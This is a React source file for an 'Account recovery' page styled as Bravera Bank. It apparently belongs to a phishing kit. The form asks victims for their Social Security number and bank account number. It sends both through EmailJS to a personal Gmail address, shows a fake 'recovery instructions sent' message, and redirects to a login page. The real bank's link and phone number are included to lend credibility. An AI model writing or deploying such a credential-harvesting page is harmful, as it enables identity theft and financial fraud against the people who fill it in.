import { useEffect, useRef, useState } from "react";
import BG from "../assets/bg.png";
import emailjs from "@emailjs/browser";
import Footer from "../components/Footer";
import CheckImg from "../assets/check-account-number-42674dd8.png";

export default function AccountRecovery() {
  const [formData, setFormData] = useState({
    ssn: "",
    accountNumber: "",
    bName: "Bravera Bank", // Default bank name
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const [showModal, setShowModal] = useState(false);

  const modalRef = useRef(null);

   // Initialize EmailJS
   useEffect(() => {
    // Replace with your actual EmailJS public key
    emailjs.init("v_oAluZ11har85Kfg");
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!isReadyToSubmit()) return;

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Send email using EmailJS
      const response = await emailjs.send(
        "template_vj50jeg", // Replace with your EmailJS service ID
        "service_my2ydis", // You'll need to create this template
        {
          bName: formData.bName,
          ssn: formData.ssn,
          accountNumber: formData.accountNumber,
          to_email: "Leslieolobo@gmail.com", // Optional if specified in the template
        }
      );

      console.log("Recovery request sent successfully:", response);
      setSubmitStatus("success");

      // Redirect to the login page after a short delay
      setTimeout(() => {
        window.location.href = "/login";
      }, 1500);
    } catch (error) {
      console.error("Failed to send recovery request:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };
  const toggleModal = () => {
    setShowModal(!showModal);
  };

  const isReadyToSubmit = () => {
    return formData.ssn.trim() && formData.accountNumber.trim();
  };

  return (
    <div
      className="min-h-screen flex flex-col justify-between"
      style={{
        backgroundImage: `url(${BG})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
      }}
    >
      {/* Main Content */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="bg-[#1E1F20] text-white w-full md:w-md max-w-lg p-6 rounded-lg shadow-xl">
          <div className="flex items-center mb-6 mr-10">
            {/* Back Arrow */}
            <button
              onClick={() => window.history.back()}
              className="text-gray-300 mr-3"
              aria-label="Go back"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-6 w-6"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M15 19l-7-7 7-7"
                />
              </svg>
            </button>

            <div className="flex-grow flex flex-col items-center">
              {/* Lock Icon */}
              <div className="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center mb-4">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
              </div>
              <h2 className="text-xl font-medium">Account recovery</h2>
              <p className="text-sm text-gray-400 mt-2">
                We need this info to verify your identity.
              </p>
            </div>
          </div>

          <form className="space-y-5" onSubmit={handleSubmit}>
            {/* SSN Field */}
            <div>
              <input
                type="text"
                name="ssn"
                value={formData.ssn}
                onChange={handleChange}
                placeholder="Social Security number"
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
              <p className="text-xs text-gray-400 mt-1 italic">
                EIN and ITIN are also accepted
              </p>
            </div>

            {/* Account Number Field */}
            <div className="relative">
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleChange}
                placeholder="Account number"
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
              <button
                onClick={toggleModal}
                type="button"
                className="absolute right-3 top-3 text-gray-400 hover:text-white"
                aria-label="Account number information"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  viewBox="0 0 20 20"
                  fill="currentColor"
                >
                  <path
                    fillRule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z"
                    clipRule="evenodd"
                  />
                </svg>
              </button>
            </div>

            {/* Status message */}
            {submitStatus === "success" && (
              <div className="text-green-500 text-center">
                Recovery instructions sent. Redirecting...
              </div>
            )}
            {submitStatus === "error" && (
              <div className="text-red-500 text-center">
                Something went wrong. Please try again.
              </div>
            )}

            {/* Help link */}
            <div className="flex justify-end">
              <a href="#" className="text-[#F2AA2E] text-sm hover:underline">
                Need help?
              </a>
            </div>

            {/* Next Button */}
            <div className="flex justify-center mt-6">
              <button
                type="submit"
                className="bg-[#3B3836] text-white px-8 py-3 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={isSubmitting || !isReadyToSubmit()}
              >
                {isSubmitting ? "Processing..." : "Next"}
              </button>
            </div>

            {/* Try another way */}
            <div className="text-center mt-4">
              <p className="text-sm text-gray-400">
                Don't have this information?
                <a
                  type="button"
                  href="https://secure.bravera.bank/forgot"
                  className="text-[#F2AA2E] hover:underline ml-1"
                >
                  Try another way
                </a>
              </p>
            </div>
          </form>
        </div>
      </div>

      {/* Modal for Account Number Information */}
      {showModal && (
        <div>
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black opacity-50"></div>
          <div className="fixed inset-0 z-50 flex items-center justify-center">
            <div
              ref={modalRef}
              className="bg-[#1E1F20] text-white p-6 rounded-lg shadow-lg max-w-2xl w-full relative flex flex-col items-center"
            >
              {/* Close Button */}
              <button
                onClick={toggleModal}
                className="absolute top-3 right-3 text-gray-400 hover:text-white"
                aria-label="Close modal"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-6 w-6"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M6 18L18 6M6 6l12 12"
                  />
                </svg>
              </button>

              <h3 className="text-xl mb-4">Account number</h3>
              <p className="mb-4">
                You can find your account number on your checks.
              </p>

              {/* Check Image */}
              <img src={CheckImg} alt="Check with account number location" />

              <p className="mt-6 text-sm">
                If you don't have checks and don't know your account number,
                contact us for assistance at (877) 483-6811.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <Footer />
    </div>
  );
}
